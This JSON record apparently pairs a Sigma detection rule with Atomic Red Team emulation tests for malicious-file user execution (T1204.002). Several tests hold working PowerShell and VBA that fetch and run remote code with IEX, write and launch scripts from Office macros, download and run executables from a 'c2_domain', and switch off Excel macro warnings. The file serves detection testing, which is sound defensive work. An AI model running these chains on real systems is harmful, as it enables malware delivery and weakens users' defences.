                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "04f5363a-6bca-42ff-be70-0d28bf629ead",
                        "lookup_data": {
                            "description": "Initial execution of malicious document calls wmic to execute the file with regsvr32",
                            "raw": "author: Vadim Khrykov (ThreatIntel), Cyb3rEng (Rule)\ndate: 2021/08/23\ndescription: Initial execution of malicious document calls wmic to execute the file\n  with regsvr32\ndetection:\n  condition: all of selection*\n  selection1:\n  - Image|endswith: \\wbem\\WMIC.exe\n  - CommandLine|contains: 'wmic '\n  selection2:\n    ParentImage|endswith:\n    - \\winword.exe\n    - \\excel.exe\n    - \\powerpnt.exe\n    - \\msaccess.exe\n    - \\mspub.exe\n    - \\eqnedt32.exe\n    - \\visio.exe\nfalsepositives:\n- Unknown\nid: 04f5363a-6bca-42ff-be70-0d28bf629ead\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/12/02\nreferences:\n- https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/\n- https://github.com/vadim-hunter/Detection-Ideas-Rules/blob/02bcbfc2bfb8b4da601bb30de0344ae453aa1afe/Threat%20Intelligence/The%20DFIR%20Report/20210329_Sodinokibi_(aka_REvil)_Ransomware.yaml\nstatus: experimental\ntags:\n- attack.t1204.002\n- attack.t1047\n- attack.t1218.010\n- attack.execution\n- attack.defense_evasion\ntitle: Office Applications Spawning Wmi Cli Alternate\n",
                            "sigma:id": "04f5363a-6bca-42ff-be70-0d28bf629ead",
                            "title": "Office Applications Spawning Wmi Cli Alternate",
                            "_cycat_type": "Item"
                        }
                    }
                ]
            }
        },
        "atomics": [
            {
                "attack_technique": "T1204.002",
                "display_name": "User Execution: Malicious File",
                "atomic_tests": [
                    {
                        "name": "OSTap Style Macro Execution",
                        "auto_generated_guid": "8bebc690-18c7-4549-bc98-210f7019efff",
                        "description": "This Test uses a VBA macro to create and execute #{jse_path} with cscript.exe. Upon execution, the .jse file launches wscript.exe.\nExecution is handled by [Invoke-MalDoc](https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.\nThis is a known execution chain observed by the OSTap downloader commonly used in TrickBot campaigns.\nReferences:\n  https://www.computerweekly.com/news/252470091/TrickBot-Trojan-switches-to-stealthy-Ostap-downloader\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "jse_path": {
                                "description": "Path for the macro to write out the \"malicious\" .jse file\n",
                                "type": "string",
                                "default": "C:\\Users\\Public\\art.jse"
                            },
                            "ms_product": {
                                "description": "Maldoc application Word or Excel",
                                "type": "string",
                                "default": "Word"
                            }
                        },
                        "dependency_executor_name": "powershell",
                        "dependencies": [
                            {
                                "description": "Microsoft #{ms_product} must be installed\n",
                                "prereq_command": "try {\n  New-Object -COMObject \"#{ms_product}.Application\" | Out-Null\n  $process = \"#{ms_product}\"; if ( $process -eq \"Word\") {$process = \"winword\"}\n  Stop-Process -Name $process\n  exit 0\n} catch { exit 1 }\n",
                                "get_prereq_command": "Write-Host \"You will need to install Microsoft #{ms_product} manually to meet this requirement\"\n"
                            }
                        ],
                        "executor": {
                            "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\n$macrocode = \"   Open `\"#{jse_path}`\" For Output As #1`n   Write #1, `\"WScript.Quit`\"`n   Close #1`n   Shell`$ `\"cscript.exe #{jse_path}`\"`n\"\nInvoke-MalDoc -macroCode $macrocode -officeProduct \"#{ms_product}\"\n",
                            "cleanup_command": "Remove-Item #{jse_path} -ErrorAction Ignore\n",
                            "name": "powershell"
                        }
                    },
                    {
                        "name": "OSTap Payload Download",
                        "auto_generated_guid": "3f3af983-118a-4fa1-85d3-ba4daa739d80",
                        "description": "Uses cscript //E:jscript to download a file\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "script_file": {
                                "description": "File to execute jscript code from",
                                "type": "path",
                                "default": "%TEMP%\\OSTapGet.js"
                            },
                            "file_url": {
                                "description": "URL to retrieve file from",
                                "type": "url",
                                "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt"
                            }
                        },
                        "executor": {
                            "command": "echo var url = \"#{file_url}\", fso = WScript.CreateObject('Scripting.FileSystemObject'), request, stream; request = WScript.CreateObject('MSXML2.ServerXMLHTTP'); request.open('GET', url, false); request.send(); if (request.status === 200) {stream = WScript.CreateObject('ADODB.Stream'); stream.Open(); stream.Type = 1; stream.Write(request.responseBody); stream.Position = 0; stream.SaveToFile('ostapout.txt', 1); stream.Close();} else {WScript.Quit(1);}WScript.Quit(0); > #{script_file}\ncscript //E:Jscript #{script_file}\n",
                            "cleanup_command": "del #{script_file} /F /Q >nul 2>&1\n",
                            "name": "command_prompt"
                        }
                    },
                    {
                        "name": "Maldoc choice flags command execution",
                        "auto_generated_guid": "0330a5d2-a45a-4272-a9ee-e364411c4b18",
                        "description": "This Test uses a VBA macro to execute cmd with flags observed in recent maldoc and 2nd stage downloaders. Upon execution, CMD will be launched.\nExecution is handled by [Invoke-MalDoc](https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "ms_product": {
                                "description": "Maldoc application Word or Excel",
                                "type": "string",
                                "default": "Word"
                            }
                        },
                        "dependency_executor_name": "powershell",
                        "dependencies": [
                            {
                                "description": "Microsoft #{ms_product} must be installed\n",
                                "prereq_command": "try {\n  New-Object -COMObject \"#{ms_product}.Application\" | Out-Null\n  $process = \"#{ms_product}\"; if ( $process -eq \"Word\") {$process = \"winword\"}\n  Stop-Process -Name $process\n  exit 0\n} catch { exit 1 }\n",
                                "get_prereq_command": "Write-Host \"You will need to install Microsoft #{ms_product} manually to meet this requirement\"\n"
                            }
                        ],
                        "executor": {
                            "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\n$macrocode = \"  a = Shell(`\"cmd.exe /c choice /C Y /N /D Y /T 3`\", vbNormalFocus)\"\nInvoke-MalDoc -macroCode $macrocode -officeProduct \"#{ms_product}\"\n",
                            "name": "powershell"
                        }
                    },
                    {
                        "name": "OSTAP JS version",
                        "auto_generated_guid": "add560ef-20d6-4011-a937-2c340f930911",
                        "description": "Malicious JavaScript executing CMD which spawns wscript.exe //e:jscript\nExecution is handled by [Invoke-MalDoc](https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "jse_path": {
                                "description": "jse file to execute with wscript",
                                "type": "path",
                                "default": "C:\\Users\\Public\\art.jse"
                            },
                            "ms_product": {
                                "description": "Maldoc application Word or Excel",
                                "type": "string",
                                "default": "Word"
                            }
                        },
                        "dependency_executor_name": "powershell",
                        "dependencies": [
                            {
                                "description": "Microsoft #{ms_product} must be installed\n",
                                "prereq_command": "try {\n  New-Object -COMObject \"#{ms_product}.Application\" | Out-Null\n  $process = \"#{ms_product}\"; if ( $process -eq \"Word\") {$process = \"winword\"}\n  Stop-Process -Name $process\n  exit 0\n} catch { exit 1 }\n",
                                "get_prereq_command": "Write-Host \"You will need to install Microsoft #{ms_product} manually to meet this requirement\"\n"
                            }
                        ],
                        "executor": {
                            "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\n$macrocode = \"   Open `\"#{jse_path}`\" For Output As #1`n   Write #1, `\"WScript.Quit`\"`n   Close #1`n   a = Shell(`\"cmd.exe /c wscript.exe //E:jscript #{jse_path}`\", vbNormalFocus)`n\"\nInvoke-MalDoc -macroCode $macrocode -officeProduct \"#{ms_product}\"\n",
                            "name": "powershell"
                        }
                    },
                    {
                        "name": "Office launching .bat file from AppData",
                        "auto_generated_guid": "9215ea92-1ded-41b7-9cd6-79f9a78397aa",
                        "description": "Microsoft Office creating then launching a .bat script from an AppData directory. The .bat file launches calc.exe when opened.",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "bat_path": {
                                "description": "Path to malicious .bat file",
                                "type": "string",
                                "default": "$(\"$env:temp\\art1204.bat\")"
                            },
                            "ms_product": {
                                "description": "Maldoc application Word or Excel",
                                "type": "string",
                                "default": "Word"
                            }
                        },
                        "dependency_executor_name": "powershell",
                        "dependencies": [
                            {
                                "description": "Microsoft #{ms_product} must be installed\n",
                                "prereq_command": "try {\n  New-Object -COMObject \"#{ms_product}.Application\" | Out-Null\n  $process = \"#{ms_product}\"; if ( $process -eq \"Word\") {$process = \"winword\"}\n  Stop-Process -Name $process\n  exit 0\n} catch { exit 1 }\n",
                                "get_prereq_command": "Write-Host \"You will need to install Microsoft #{ms_product} manually to meet this requirement\"\n"
                            }
                        ],
                        "executor": {
                            "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\n$macrocode = \"   Open `\"#{bat_path}`\" For Output As #1`n   Write #1, `\"calc.exe`\"`n   Close #1`n   a = Shell(`\"cmd.exe /c #{bat_path} `\", vbNormalFocus)`n\"\nInvoke-MalDoc -macroCode $macrocode -officeProduct #{ms_product}\n",
                            "cleanup_command": "Remove-Item #{bat_path} -ErrorAction Ignore\nGet-Process | Where-Object { $_.MainModule.FileName -like \"*calculator*\" } | Stop-Process\n",
                            "name": "powershell"
                        }
                    },
                    {
                        "name": "Excel 4 Macro",
                        "auto_generated_guid": "4ea1fc97-8a46-4b4e-ba48-af43d2a98052",
                        "description": "This module creates an Excel 4 Macro (XLM) enabled spreadsheet and executes it. The XLM will first write a \"malicious\"\nVBS file to %TEMP%, then execute this file. The VBS will download Process Explorer to the same directory (%TEMP%) and exec.\n\nA note regarding this module. By default, this module will pull the current username from the system and places it into the macro. If\nyou'd like to utilize the \"=GET.WORKSPACE(26)\" method, that many maldoc authors use, you will need to ensure that the User Name associated\nwith Excel matches that of the local system. This username can be found under Files -> Options -> Username\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "download_url": {
                                "description": "Download URL",
                                "type": "string",
                                "default": "https://live.sysinternals.com/procexp.exe"
                            },
                            "uname": {
                                "description": "Username for pathing",
                                "type": "string",
                                "default": "$env:Username"
                            }
                        },
                        "dependency_executor_name": "powershell",
                        "dependencies": [
                            {
                                "description": "Microsoft Excel must be installed\n",
                                "prereq_command": "try {\n  New-Object -COMObject \"Excel.Application\" | Out-Null\n  Stop-Process -Name \"Excel\"\n  exit 0\n} catch { exit 1 }\n",
                                "get_prereq_command": "Write-Host \"You will need to install Microsoft Excel manually to meet this requirement\"\n"
                            }
                        ],
                        "executor": {
                            "command": "$fname = \"$env:TEMP\\atomic_redteam_x4m_exec.vbs\"\n$fname1 = \"$env:TEMP\\procexp.exe\"\nif (Test-Path $fname) {\n  Remove-Item $fname\n  Remove-Item $fname1\n}\n\n$xlApp = New-Object -COMObject \"Excel.Application\"\n$xlApp.Visible = $True\n$xlApp.DisplayAlerts = $False\n$xlBook = $xlApp.Workbooks.Add()\n$sheet = $xlBook.Excel4MacroSheets.Add()\n\nif (\"#{uname}\" -ne \"\") {\n  $sheet.Cells.Item(1,1) = \"#{uname}\"\n} else {\n  $sheet.Cells.Item(1,1) = \"=GET.WORKSPACE(26)\"\n}\n\n$sheet.Cells.Item(2,1) = \"procexp.exe\"\n$sheet.Cells.Item(3,1) = \"atomic_redteam_x4m_exec.vbs\"\n$sheet.Cells.Item(4,1) = \"=IF(ISNUMBER(SEARCH(`\"64`\",GET.WORKSPACE(1))), GOTO(A5),)\"\n$sheet.Cells.Item(5,1) = \"=FOPEN(`\"C:\\Users\\`\"&A1&`\"\\AppData\\Local\\Temp\\`\"&A3&`\"`\", 3)\"\n$sheet.Cells.Item(6,1) = \"=FWRITELN(A5, `\"url = `\"`\"#{download_url}`\"`\"`\")\"\n$sheet.Cells.Item(7,1) = \"=FWRITELN(A5, `\"`\")\"\n$sheet.Cells.Item(8,1) = \"=FWRITELN(A5, `\"Set winHttp = CreateObject(`\"`\"WinHTTP.WinHTTPrequest.5.1`\"`\")`\")\"\n$sheet.Cells.Item(9,1) = \"=FWRITELN(A5, `\"winHttp.Open `\"`\"GET`\"`\", url, False`\")\"\n$sheet.Cells.Item(10,1) = \"=FWRITELN(A5, `\"winHttp.Send`\")\"\n$sheet.Cells.Item(11,1) = \"=FWRITELN(A5, `\"If winHttp.Status = 200 Then`\")\"\n$sheet.Cells.Item(12,1) = \"=FWRITELN(A5, `\"Set oStream = CreateObject(`\"`\"ADODB.Stream`\"`\")`\")\"\n$sheet.Cells.Item(13,1) = \"=FWRITELN(A5, `\"oStream.Open`\")\"\n$sheet.Cells.Item(14,1) = \"=FWRITELN(A5, `\"oStream.Type = 1`\")\"\n$sheet.Cells.Item(15,1) = \"=FWRITELN(A5, `\"oStream.Write winHttp.responseBody`\")\"\n$sheet.Cells.Item(16,1) = \"=FWRITELN(A5, `\"oStream.SaveToFile `\"`\"C:\\Users\\`\"&A1&`\"\\AppData\\Local\\Temp\\`\"&A2&`\"`\"`\", 2`\")\"\n$sheet.Cells.Item(17,1) = \"=FWRITELN(A5, `\"oStream.Close`\")\"\n$sheet.Cells.Item(18,1) = \"=FWRITELN(A5, `\"End If`\")\"\n$sheet.Cells.Item(19,1) = \"=FCLOSE(A5)\"\n$sheet.Cells.Item(20,1) = \"=EXEC(`\"explorer.exe C:\\Users\\`\"&A1&`\"\\AppData\\Local\\Temp\\`\"&A3&`\"`\")\"\n$sheet.Cells.Item(21,1) = \"=WAIT(NOW()+`\"00:00:05`\")\"\n$sheet.Cells.Item(22,1) = \"=EXEC(`\"explorer.exe C:\\Users\\`\"&A1&`\"\\AppData\\Local\\Temp\\`\"&A2&`\"`\")\"\n$sheet.Cells.Item(23,1) = \"=HALT()\"\n$sheet.Cells.Item(1,1).Name = \"runme\"\n$xlApp.Run(\"runme\")\n$xlApp.Quit()\n\n[System.Runtime.Interopservices.Marshal]::ReleaseComObject($xlBook) | Out-Null\n[System.Runtime.Interopservices.Marshal]::ReleaseComObject($xlApp) | Out-Null\n[System.GC]::Collect()\n[System.GC]::WaitForPendingFinalizers()\n\nRemove-Variable xlBook\nRemove-Variable xlApp\n",
                            "cleanup_command": "Stop-Process -Name \"procexp*\" -ErrorAction Ignore\nRemove-Item \"$env:TEMP\\atomic_redteam_x4m_exec.vbs\" -ErrorAction Ignore\nRemove-Item \"$env:TEMP\\procexp.exe\" -ErrorAction Ignore\n",
                            "name": "powershell"
                        }
                    },
                    {
                        "name": "Headless Chrome code execution via VBA",
                        "auto_generated_guid": "a19ee671-ed98-4e9d-b19c-d1954a51585a",
                        "description": "This module uses Google Chrome combined with ScriptControl to achieve code execution. It spawns a local\nwebserver hosting our malicious payload. Headless Google Chrome will then reach out to this webserver\nand pull down the script and execute it. By default the payload will execute calc.exe on the system.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "dependency_executor_name": "powershell",
                        "dependencies": [
                            {
                                "description": "Microsoft Word must be installed\n",
                                "prereq_command": "try {\n  $wdApp = New-Object -COMObject \"Word.Application\"\n  Stop-Process -Name \"winword\"\n  exit 0 } catch { exit 1 }\n",
                                "get_prereq_command": "Write-Host \"You will need to install Microsoft Word manually to meet this requirement\"\n"
                            },
                            {
                                "description": "Google Chrome must be installed\n",
                                "prereq_command": "try {\n  $chromeInstalled = (Get-Item (Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe').'(Default)').VersionInfo.FileName\n  exit 0\n} catch { exit 1 }\n",
                                "get_prereq_command": "Write-Host \"You will need to install Google Chrome manually to meet this requirement\"\n"
                            }
                        ],
                        "executor": {
                            "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\nInvoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1204.002\\src\\chromeexec-macrocode.txt\" -officeProduct \"Word\" -sub \"ExecChrome\"\n",
                            "name": "powershell",
                            "cleanup_command": "Stop-Process -name mshta\n"
                        }
                    },
                    {
                        "name": "Potentially Unwanted Applications (PUA)",
                        "auto_generated_guid": "02f35d62-9fdc-4a97-b899-a5d9a876d295",
                        "description": "The Potentially Unwanted Applications (PUA) protection feature in antivirus software can identify and block PUAs from downloading and installing on endpoints in your network. These applications are not considered viruses, malware, or other types of threats, but might perform actions on endpoints that adversely affect their performance or use. This file is similar to EICAR test virus file, but is considered a Potentially Unwanted Application (PUA) instead of a VIRUS (i.e. not actually malicious, but is flagged as it to verify anti-pua protection).\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "pua_url": {
                                "description": "url to PotentiallyUnwanted.exe",
                                "type": "url",
                                "default": "http://amtso.eicar.org/PotentiallyUnwanted.exe"
                            },
                            "pua_file": {
                                "description": "path to PotentiallyUnwanted.exe",
                                "type": "path",
                                "default": "$env:TEMP/PotentiallyUnwanted.exe"
                            }
                        },
                        "executor": {
                            "name": "powershell",
                            "elevation_required": false,
                            "command": "Invoke-WebRequest #{pua_url} -OutFile #{pua_file}\n& \"#{pua_file}\"\n",
                            "cleanup_command": "Stop-Process -name PotentiallyUnwanted\nRemove-Item #{pua_file} -ErrorAction Ignore\n"
                        }
                    },
                    {
                        "name": "Office Generic Payload Download",
                        "auto_generated_guid": "5202ee05-c420-4148-bf5e-fd7f7d24850c",
                        "description": "This Test uses a VBA macro to launch Powershell which will download a file from a user defined web server.\nRequired input agruments are c2_domain and file_name\nExecution is handled by [Invoke-MalDoc](https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.\nExample for c2 server located at 127.0.0.1 for the file test.txt which is nested below the parent directory in the tests/my-test folder\nExample input args for file in root directory c2-domain = 127.0.0.1, file-name = test.txt\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "macro_path": {
                                "description": "Location of file which will be converted to a VBA macro\n",
                                "type": "path",
                                "default": "PathToAtomicsFolder/T1204.002/src/test9-GenericPayloadDownload.txt"
                            },
                            "c2_domain": {
                                "description": "This required variable points to a user defined HTTP server that will host the file_name in the c2_parent_directory.\n",
                                "type": "url",
                                "default": null
                            },
                            "c2_parent_directory": {
                                "description": "Parent directory where you have the \"malicious\" file on c2_domain server.\nWill default to root directory. Forward slashes are not needed at begining or ending of directory path\n",
                                "type": "path",
                                "default": ""
                            },
                            "file_name": {
                                "description": "\"Malicious\" file to be downloaded.\nThis required file needs to be place on the user provided c2 domain\nExample file can be found at PathToAtomicsFolder/T1204.002/src/test9-example-payload.txt\n",
                                "type": "string",
                                "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/test9-example-payload.txt"
                            },
                            "ms_product": {
                                "description": "Maldoc application Word or Excel\n",
                                "type": "string",
                                "default": "Word"
                            }
                        },
                        "dependency_executor_name": "powershell",
                        "dependencies": [
                            {
                                "description": "Destination c2_domain name or IP address must be set to a running HTTP server.\n",
                                "prereq_command": "if (#{c2_domain}) (exit 0) else (exit 1)\n",
                                "get_prereq_command": "Write-Host \"Destination c2 server domain name or IP address must be set and reachable for HTTP service\"\n"
                            },
                            {
                                "description": "Microsoftt #{ms_product} must be installed\n",
                                "prereq_command": "try {\n  New-Object -COMObject \"#{ms_product}.Application\" | Out-Null\n  $process = \"#{ms_product}\"; if ( $process -eq \"Word\") {$process = \"winword\"}\n  Stop-Process -Name $process\n  exit 0\n} catch { exit 1 }\n",
                                "get_prereq_command": "Write-Host \"You will need to install Microsoft #{ms_product} manually to meet this requirement\"\n"
                            }
                        ],
                        "executor": {
                            "name": "powershell",
                            "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\n$macroCode = Get-Content \"#{macro_path}\" -Raw\n$URL = \"#{c2_domain}\" + \"/\" + \"#{c2_parent_directory}\"\n$macroCode = $macroCode -replace 'serverPath', $URL -replace 'fileName', \"#{file_name}\"\nInvoke-MalDoc -macroCode $macroCode -officeProduct \"#{ms_product}\"\n",
                            "cleanup_command": "Remove-Item \"C:\\Users\\$env:username\\Desktop\\#{file_name}\" -ErrorAction Ignore\n"
                        }
                    },
                    {
                        "name": "LNK Payload Download",
                        "auto_generated_guid": "581d7521-9c4b-420e-9695-2aec5241167f",
                        "description": "This lnk files invokes powershell to download putty from the internet and opens the file. https://twitter.com/ankit_anubhav/status/1518932941090410496",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "Invoke-WebRequest -OutFile $env:Temp\\test10.lnk \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/bin/test10.lnk\"\n$file1 = \"$env:Temp\\test10.lnk\"\nStart-Process $file1\nStart-Sleep -s 10\ntaskkill /IM a.exe /F\n",
                            "cleanup_command": "$file1 = \"$env:Temp\\test10.lnk\"\n$file2 = \"$env:Temp\\a.exe\"\nRemove-Item $file1 -ErrorAction Ignore\nRemove-Item $file2 -ErrorAction Ignore",
                            "name": "powershell"
                        }
                    },
                    {
                        "name": "Mirror Blast Emulation",
                        "auto_generated_guid": "24fd9719-7419-42dd-bce6-ab3463110b3c",
                        "description": "Emulates the JS -> MSI chain of the MirrorBlast T505 campaign by executing an xlsm file designed. \nRequires the 32 bit version of Office to run. [MirrorBlast Campaign Analysis](https://blog.morphisec.com/explosive-new-mirrorblast-campaign-targets-financial-companies)\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "Cd \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\"\nNew-ItemProperty -Path Registry::HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Office\\16.0\\Excel\\Security -Name \"VBAWarnings\" -Value \"1\" -PropertyType DWORD -Force | Out-Null\n& '.\\Excel 2016.lnk' \"PathToAtomicsFolder\\T1204.002\\bin\\mirrorblast_emulation.xlsm\"",
                            "cleanup_command": "reg delete \"HKCU\\SOFTWARE\\Microsoft\\Office\\16.0\\Excel\\Security\" /v \"VBAWarnings\" /f",
                            "name": "powershell"
                        }
                    }
                ]
            }
        ]
    },
    "timestamp": "2025-02-28 13:56:41"
}